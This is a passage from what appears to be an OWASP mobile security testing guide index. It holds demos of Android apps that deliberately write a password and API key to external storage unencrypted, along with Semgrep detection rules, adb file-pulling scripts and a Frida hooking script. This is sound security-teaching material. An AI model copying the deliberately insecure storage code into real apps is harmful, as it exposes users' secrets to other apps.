StrictMode PenaltyLog Usage with Semgrep","text":"<p>  Download MASTG-DEMO-0039 APK   Open MASTG-DEMO-0039 Folder  Build MASTG-DEMO-0039 APK</p>","tags":["android","demo","MASTG-TEST-0265"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0039/MASTG-DEMO-0039/#sample","title":"Sample","text":"<p>This sample demonstrates the static detection of <code>StrictMode</code> in the app using Semgrep. The app enables a <code>StrictMode</code> policy to detect leaked SQLite objects and intentionally leaves a cursor unclosed to trigger the policy.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.database.sqlite.SQLiteDatabase\nimport android.os.StrictMode\n\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        enableStrictMode()\n        triggerSqliteCursorLeak()\n\n        System.gc() // Force garbage collection to trigger leak detection\n\n        return \"SUCCESS!!\\n\\nSQL Cursor leaked.\"\n    }\n\n    private fun enableStrictMode() {\n        StrictMode.setVmPolicy(\n            StrictMode.VmPolicy.Builder()\n                .detectLeakedClosableObjects() // Detect leaked/unclosed SQLite objects\n                .penaltyLog()                 // Log violations\n                .build()\n        )\n    }\n\n    private fun triggerSqliteCursorLeak() {\n        val db: SQLiteDatabase = context.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null)\n        db.execSQL(\"CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)\")\n        db.execSQL(\"INSERT INTO users (name) VALUES ('Alice'), ('Bob')\")\n\n        // Create cursor, and intentionally do not close it\n        val cursor = db.rawQuery(\"SELECT * FROM users\", null)\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.database.sqlite.SQLiteDatabase;\nimport android.os.StrictMode;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000 \\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u0002\\n\\u0000\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0002\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\b\\u0010\\u0005\\u001a\\u00020\\u0006H\\u0002J\\u0006\\u0010\\u0007\\u001a\\u00020\\bJ\\b\\u0010\\t\\u001a\\u00020\\u0006H\\u0002R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\n\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"enableStrictMode\", \"\", \"mastgTest\", \"\", \"triggerSqliteCursorLeak\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        enableStrictMode();\n        triggerSqliteCursorLeak();\n        System.gc();\n        return \"SUCCESS!!\\n\\nSQL Cursor leaked.\";\n    }\n\n    private final void enableStrictMode() {\n        StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().detectLeakedClosableObjects().penaltyLog().build());\n    }\n\n    private final void triggerSqliteCursorLeak() {\n        SQLiteDatabase db = this.context.openOrCreateDatabase(\"test.db\", 0, null);\n        Intrinsics.checkNotNullExpressionValue(db, \"openOrCreateDatabase(...)\");\n        db.execSQL(\"CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)\");\n        db.execSQL(\"INSERT INTO users (name) VALUES ('Alice'), ('Bob')\");\n        db.rawQuery(\"SELECT * FROM users\", null);\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0265"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0039/MASTG-DEMO-0039/#steps","title":"Steps","text":"<p>Let's run  semgrep rules against the sample code.</p> ../../../../rules/mastg-android-strictmode.yml<pre><code>rules:\n  - id: mastg-android-strictmode\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule scans uses of StrictMode.\n    message: \"[MASVS-RESILIENCE] Detected usage of StrictMode\"\n    patterns:\n      - pattern: StrictMode.setVmPolicy(...)\n</code></pre> run.sh<pre><code>#!/bin/bash\nNO_COLOR=true semgrep -c ../../../../rules/mastg-android-strictmode.yml ./MastgTest_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0265"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0039/MASTG-DEMO-0039/#observation","title":"Observation","text":"<p>The output shows all usages of APIs related to <code>StrictMode.setVmPolicy</code>.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-strictmode\n          [MASVS-RESILIENCE] Detected usage of StrictMode\n\n           29\u2506 StrictMode.setVmPolicy(new                                                        \n               StrictMode.VmPolicy.Builder().detectLeakedClosableObjects().penaltyLog().build());\n</code></pre>","tags":["android","demo","MASTG-TEST-0265"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0039/MASTG-DEMO-0039/#evaluation","title":"Evaluation","text":"<p>The test fails because the output shows usages of <code>StrictMode.setVmPolicy</code>.</p>","tags":["android","demo","MASTG-TEST-0265"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0001/MASTG-DEMO-0001/","title":"MASTG-DEMO-0001: File System Snapshots from External Storage","text":"<p>  Download MASTG-DEMO-0001 APK   Open MASTG-DEMO-0001 Folder  Build MASTG-DEMO-0001 APK</p>","tags":["android","demo","MASTG-TEST-0200"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0001/MASTG-DEMO-0001/#sample","title":"Sample","text":"<p>The snippet below shows sample code that creates two files in the external storage using the <code>getExternalFilesDir</code> method and the <code>MediaStore</code> API.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\nimport android.content.ContentValues\nimport android.os.Environment\nimport android.provider.MediaStore\nimport java.io.OutputStream\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        mastgTestApi()\n        mastgTestMediaStore()\n        return \"SUCCESS!!\\n\\nFiles have been written with API and MediaStore\"\n    }\n\n    fun mastgTestApi() {\n        val externalStorageDir = context.getExternalFilesDir(null)\n        val fileName = File(externalStorageDir, \"secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e)\n        }\n    }\n\n    fun mastgTestMediaStore() {\n        try {\n            val resolver = context.contentResolver\n            var randomNum = (0..100).random().toString()\n            val contentValues = ContentValues().apply {\n                put(MediaStore.MediaColumns.DISPLAY_NAME, \"secretFile$randomNum.txt\")\n                put(MediaStore.MediaColumns.MIME_TYPE, \"text/plain\")\n                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)\n            }\n            val textUri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)\n\n            textUri?.let {\n                val outputStream: OutputStream? = resolver.openOutputStream(it)\n                outputStream?.use {\n                    it.write(\"MAS_API_KEY=8767086b9f6f976g-a8df76\\n\".toByteArray())\n                    it.flush()\n                }\n                Log.d(\"MediaStore\", \"File written to external storage successfully.\")\n            } ?: run {\n                Log.e(\"MediaStore\", \"Error inserting URI to MediaStore.\")\n            }\n        } catch (exception: Exception) {\n            Log.e(\"MediaStore\", \"Error writing file to URI from MediaStore\", exception)\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0200"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0001/MASTG-DEMO-0001/#steps","title":"Steps","text":"<ol> <li>Install an app on your device.</li> <li>Execute <code>run_before.sh</code> which runs  adb.</li> <li>Open an app and exercise it to trigger file creations.</li> <li>Execute <code>run_after.sh</code>.</li> <li>Close the app once you finish testing.</li> </ol> run_before.shrun_after.sh <pre><code>#!/bin/bash\n\n# SUMMARY: This script creates a dummy file to mark a timestamp that we can use later\n# on to identify files created during the app exercising\n\nadb shell \"touch /data/local/tmp/test_start\"\n</code></pre> <pre><code>#!/bin/bash\n\n# SUMMARY: List all files created after the creation date of a file created in run_before\n\nadb shell \"find /sdcard/ -type f -newer /data/local/tmp/test_start\" &gt; output.txt\nadb shell \"rm /data/local/tmp/test_start\"\nmkdir -p new_files\nwhile read -r line; do\n  adb pull \"$line\" ./new_files/\ndone &lt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0200"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0001/MASTG-DEMO-0001/#observation","title":"Observation","text":"<p>There is a list of all created files inside <code>output.txt</code>.</p> output.txt<pre><code>/sdcard/Android/data/org.owasp.mastestapp/files/secret.txt\n/sdcard/Download/secretFile75.txt\n</code></pre> <p>Their content is inside the <code>./new_files/</code> directory and contains:</p> <p>A password:</p> new_files/secret.txt<pre><code>secr3tPa$$W0rd\n</code></pre> <p>And an API key:</p> new_files/secretFile75.txt<pre><code>MAS_API_KEY=8767086b9f6f976g-a8df76\n</code></pre>","tags":["android","demo","MASTG-TEST-0200"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0001/MASTG-DEMO-0001/#evaluation","title":"Evaluation","text":"<p>This test fails because the files are not encrypted and contain sensitive data (a password and an API key). You can further confirm this by reverse engineering the app and inspecting the code.</p>","tags":["android","demo","MASTG-TEST-0200"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0002/MASTG-DEMO-0002/","title":"MASTG-DEMO-0002: External Storage APIs Tracing with Frida","text":"<p>  Download MASTG-DEMO-0002 APK   Open MASTG-DEMO-0002 Folder  Build MASTG-DEMO-0002 APK</p>","tags":["android","demo","MASTG-TEST-0201"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0002/MASTG-DEMO-0002/#sample","title":"Sample","text":"<p>The snippet below shows sample code that creates two files in external storage using the <code>getExternalFilesDir</code> method and the <code>MediaStore</code> API.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\nimport android.content.ContentValues\nimport android.os.Environment\nimport android.provider.MediaStore\nimport java.io.OutputStream\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        mastgTestApi()\n        mastgTestMediaStore()\n        return \"SUCCESS!!\\n\\nFiles have been written with API and MediaStore\"\n    }\n    fun mastgTestApi() {\n        val externalStorageDir = context.getExternalFilesDir(null)\n        val fileName = File(externalStorageDir, \"secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e)\n        }\n    }\n\n    fun mastgTestMediaStore() {\n        try {\n            val resolver = context.contentResolver\n            var randomNum = (0..100).random().toString()\n            val contentValues = ContentValues().apply {\n                put(MediaStore.MediaColumns.DISPLAY_NAME, \"secretFile$randomNum.txt\")\n                put(MediaStore.MediaColumns.MIME_TYPE, \"text/plain\")\n                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)\n            }\n            val textUri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)\n\n            textUri?.let {\n                val outputStream: OutputStream? = resolver.openOutputStream(it)\n                outputStream?.use {\n                    it.write(\"MAS_API_KEY=8767086b9f6f976g-a8df76\\n\".toByteArray())\n                    it.flush()\n                }\n                Log.d(\"MediaStore\", \"File written to external storage successfully.\")\n            } ?: run {\n                Log.e(\"MediaStore\", \"Error inserting URI to MediaStore.\")\n            }\n        } catch (exception: Exception) {\n            Log.e(\"MediaStore\", \"Error writing file to URI from MediaStore\", exception)\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0201"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0002/MASTG-DEMO-0002/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for Android installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn the app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> <p>The <code>run.sh</code> script injects a  Frida for Android script named <code>script.js</code>. This script hooks and logs calls to the native <code>open</code> function and to <code>android.content.ContentResolver.insert</code>. It logs the paths of files written to external storage, the caller's stack trace, and additional details such as the <code>ContentValues</code> provided.</p> <p>Note: When apps write files using the <code>ContentResolver.insert()</code> method, the files are managed by Android's MediaStore and are identified by <code>content://</code> URIs, not direct file system paths. This design abstracts the actual file locations, making them inaccessible through standard file system operations like the <code>open</code> function in libc. Consequently, when using Frida to hook into file operations, intercepting calls to <code>open</code> won't reveal these files.</p> run.shscript.js <pre><code>#!/bin/bash\n\n# SUMMARY: This script uses frida to trace files that an app has opened since it spawned\n# The script filters the output of frida-trace to print only the paths belonging to external\n# storage but the the predefined list of external storage paths might not be complete.\n# A sample output is shown in \"output.txt\". If the output is empty, it indicates that no external\n# storage is used.\n\nfrida \\\n    -U \\\n    -f org.owasp.mastestapp \\\n    -l script.js \\\n    -o output.txt\n</code></pre> <pre><code>function printBacktrace(maxLines = 8) {\n    Java.perform(() =&gt; {\n        let Exception = Java.use(\"java.lang.Exception\");\n        let stackTrace = Exception.$new().getStackTrace().toString().split(\",\");\n        console.log(\"\\nBacktrace:\");\n        for (let i = 0; i &lt; Math.min(maxLines, stackTrace.length); i++) {\n            console.log(stackTrace[i]);\n        }\n    });\n};\n\n// Intercept libc's open to make sure we cover all Java I/O APIs\nInterceptor.attach(\n    Process.getModuleByName('libc.so').getExportByName('open'),\n    {\n        onEnter: function(args) {\n            const external_paths = ['/sdcard', '/storage/emulated'];\n            const path = args[0].readCString();\n            external_paths.forEach(external_path =&gt; {\n                if (path.indexOf(external_path) === 0) {\n                    console.log(`\\n[*] open called to open a file from external storage at: ${path}`);\n                    printBacktrace(15);\n                }\n            });\n        }\n    }\n);\n\n// Hook ContentResolver.insert to log ContentValues (including keys like _display_name, mime_type, and relative_path) and returned URI\nJava.perform(() =&gt; {\n    let ContentResolver = Java.use(\"android.content.ContentResolver\");\n    ContentResolver.insert.overload('android.net.Uri', 'android.content.ContentValues').implementation = function(uri, values) {\n        console.log(`\\n[*] ContentResolver.insert called with ContentValues:`);\n\n        console.log(`\\t_display_name: ${values.get(\"_display_name\").toString()}`);\n        console.log(`\\tmime_type: ${values.get(\"mime_type\").toString()}`);\n        console.log(`\\trelative_path: ${values.get(\"relative_path\").toString()}`);\n\n        let result = this.insert(uri, values);\n        console.log(`\\n[*] ContentResolver.insert returned URI: ${result.toString()}`);\n        printBacktrace();\n        return result;\n    };\n});\n</code></pre>","tags":["android","demo","MASTG-TEST-0201"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0002/MASTG-DEMO-0002/#observation","title":"Observation","text":"<p>In the output you can observe the file paths, the relevant stack traces, and other details that help identify which APIs were used to write to external storage and their respective callers.</p> output.txt<pre><code>[*] open called to open a file from external storage at: /storage/emulated/0/Android/data/org.owasp.mastestapp/files/secret.txt\n\nBacktrace:\nlibcore.io.Linux.open(Native Method)\nlibcore.io.ForwardingOs.open(ForwardingOs.java:563)\nlibcore.io.BlockGuardOs.open(BlockGuardOs.java:274)\nlibcore.io.ForwardingOs.open(ForwardingOs.java:563)\nandroid.app.ActivityThread$AndroidOs.open(ActivityThread.java:8063)\nlibcore.io.IoBridge.open(IoBridge.java:560)\njava.io.FileOutputStream.&lt;init&gt;(FileOutputStream.java:236)\njava.io.FileOutputStream.&lt;init&gt;(FileOutputStream.java:186)\norg.owasp.mastestapp.MastgTest.mastgTestApi(MastgTest.kt:26)\norg.owasp.mastestapp.MastgTest.mastgTest(MastgTest.kt:16)\norg.owasp.mastestapp.MainActivityKt.MainScreen$lambda$9$lambda$8(MainActivity.kt:53)\norg.owasp.mastestapp.MainActivityKt.$r8$lambda$PhzGLzmkS_ibruOfiTT32AhzWl4(Unknown Source:0)\norg.owasp.mastestapp.MainActivityKt$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)\njava.lang.Thread.run(Thread.java:1012)\n\n[*] ContentResolver.insert called with ContentValues:\n        _display_name: secretFile59.txt\n        mime_type: text/plain\n        relative_path: Download\n\n[*] ContentResolver.insert returned URI: content://media/external/downloads/1000000143\n\nBacktrace:\nandroid.content.ContentResolver.insert(Native Method)\norg.owasp.mastestapp.MastgTest.mastgTestMediaStore(MastgTest.kt:44)\norg.owasp.mastestapp.MastgTest.mastgTest(MastgTest.kt:17)\norg.owasp.mastestapp.MainActivityKt.MainScreen$lambda$9$lambda$8(MainActivity.kt:53)\norg.owasp.mastestapp.MainActivityKt.$r8$lambda$PhzGLzmkS_ibruOfiTT32AhzWl4(Unknown Source:0)\norg.owasp.mastestapp.MainActivityKt$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)\njava.lang.Thread.run(Thread.java:1012)\n</code></pre> <p>Two files are written to external storage:</p> <ul> <li><code>/storage/emulated/0/Android/data/org.owasp.mastestapp/files/secret.txt</code>:<ul> <li>Written via <code>java.io.FileOutputStream</code></li> <li>Location: <code>org.owasp.mastestapp.MastgTest.mastgTestApi(MastgTest.kt:26)</code>.</li> </ul> </li> <li><code>secretFile55.txt</code>:<ul> <li>Written via <code>android.content.ContentResolver.insert</code></li> <li>Location: <code>org.owasp.mastestapp.MastgTest.mastgTestMediaStore(MastgTest.kt:44)</code>.</li> <li>Found as URI: <code>content://media/external/downloads/1000000108</code>.</li> </ul> </li> </ul> <p>The <code>ContentResolver.insert</code> call used the following <code>ContentValues</code>:</p> <ul> <li><code>_display_name: secretFile55.txt</code></li> <li><code>mime_type: text/plain</code></li> <li><code>relative_path: Download</code></li> </ul> <p>Using this information we can infer the path of the file written to external storage: <code>/storage/emulated/0/Download/secretFile55.txt</code>.</p>","tags":["android","demo","MASTG-TEST-0201"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0002/MASTG-DEMO-0002/#evaluation","title":"Evaluation","text":"<p>This test fails because the files are not encrypted and contain sensitive data (such as a password and an API key). This can be further confirmed by reverse-engineering the app to inspect its code and retrieving the files from the device.</p>","tags":["android","demo","MASTG-TEST-0201"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0003/MASTG-DEMO-0003/","title":"MASTG-DEMO-0003: App Writing to External Storage without Scoped Storage Restrictions","text":"<p>  Download MASTG-DEMO-0003 APK   Open MASTG-DEMO-0003 Folder  Build MASTG-DEMO-0003 APK</p>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0003/MASTG-DEMO-0003/#sample","title":"Sample","text":"<p>The snippet below shows sample code that creates a file in external storage without using scoped storage APIs. The <code>getExternalStorageDirectory</code> API returns a path to the root of the shared external storage (e.g. <code>/storage/emulated/0</code>).</p> <p>This requires special app access called \"All files access\", so the <code>MANAGE_EXTERNAL_STORAGE</code> permission must be declared in the manifest file.</p> MastgTest.ktMastgTest_reversed.javaAndroidManifest.xmlAndroidManifest_reversed.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.os.Environment\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val externalStorageDir = Environment.getExternalStorageDirectory()\n\n        val fileName = File(externalStorageDir, \"secret.txt\")\n        val fileContent = \"Secret not using scoped storage\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e)\n            return \"ERROR!!\\n\\nError writing file to external storage. Do you have the MANAGE_EXTERNAL_STORAGE permission in the manifest and it's granted in 'All files access'?\"\n        }\n\n        return \"SUCCESS!!\\n\\nFile $fileName with content $fileContent saved to $externalStorageDir\"\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.os.Environment;\nimport android.util.Log;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport kotlin.Metadata;\nimport kotlin.io.CloseableKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        File externalStorageDir = Environment.getExternalStorageDirectory();\n        File fileName = new File(externalStorageDir, \"secret.txt\");\n        try {\n            FileOutputStream fileOutputStream = new FileOutputStream(fileName);\n            try {\n                FileOutputStream output = fileOutputStream;\n                byte[] bytes = \"Secret not using scoped storage\".getBytes(Charsets.UTF_8);\n                Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n                output.write(bytes);\n                Log.d(\"WriteExternalStorage\", \"File written to external storage successfully.\");\n                CloseableKt.closeFinally(fileOutputStream, null);\n                return \"File \" + fileName + \" with content Secret not using scoped storage saved to \" + externalStorageDir;\n            } finally {\n            }\n        } catch (IOException e) {\n            Log.e(\"WriteExternalStorage\", \"Error writing file to external storage\", e);\n            return \"Error writing file to external storage. Do you have the MANAGE_EXTERNAL_STORAGE permission in the manifest and it's granted?\";\n        }\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"34\" android:compileSdkVersionCodename=\"14\" package=\"org.owasp.mastestapp\" platformBuildVersionCode=\"34\" platformBuildVersionName=\"14\"&gt;\n    &lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\"/&gt;\n    &lt;permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\" android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application android:allowBackup=\"true\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:dataExtractionRules=\"@xml/data_extraction_rules\" android:debuggable=\"true\" android:extractNativeLibs=\"false\" android:fullBackupContent=\"@xml/backup_rules\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:testOnly=\"true\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n        &lt;activity android:exported=\"true\" android:name=\"org.owasp.mastestapp.MainActivity\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.compose.ui.tooling.PreviewActivity\"/&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.activity.ComponentActivity\"/&gt;\n        &lt;provider android:authorities=\"org.owasp.mastestapp.androidx-startup\" android:exported=\"false\" android:name=\"androidx.startup.InitializationProvider\"&gt;\n            &lt;meta-data android:name=\"androidx.emoji2.text.EmojiCompatInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.lifecycle.ProcessLifecycleInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.profileinstaller.ProfileInstallerInitializer\" android:value=\"androidx.startup\"/&gt;\n        &lt;/provider&gt;\n        &lt;receiver android:directBootAware=\"false\" android:enabled=\"true\" android:exported=\"true\" android:name=\"androidx.profileinstaller.ProfileInstallReceiver\" android:permission=\"android.permission.DUMP\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SKIP_FILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SAVE_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.BENCHMARK_OPERATION\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0202"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0003/MASTG-DEMO-0003/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the reversed java code.</p> ../../../../rules/mastg-android-data-unencrypted-shared-storage-no-user-interaction-apis.yml<pre><code>rules:\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-public\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"external storage\" which is shared with other apps\n    message: \"[MASVS-STORAGE] Make sure to encrypt files at these locations if necessary\"\n    pattern-either:\n      - pattern: $X.getExternalStorageDirectory(...)\n      - pattern: $X.getExternalStoragePublicDirectory(...)\n      - pattern: $X.getDownloadCacheDirectory(...)\n      - pattern: Intent.ACTION_CREATE_DOCUMENT\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-external-api-scoped\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for methods that returns locations to \"scoped external storage\"\n    message: \"[MASVS-STORAGE] These locations might be accessible to other apps on Android 10 and below given relevant permissions\"\n    pattern-either:\n      - pattern: $X.getExternalFilesDir(...)\n      - pattern: $X.getExternalFilesDirs(...)\n      - pattern: $X.getExternalCacheDir(...)\n      - pattern: $X.getExternalCacheDirs(...)\n      - pattern: $X.getExternalMediaDirs(...)\n  - id: mastg-android-data-unencrypted-shared-storage-no-user-interaction-mediastore\n    severity: WARNING\n    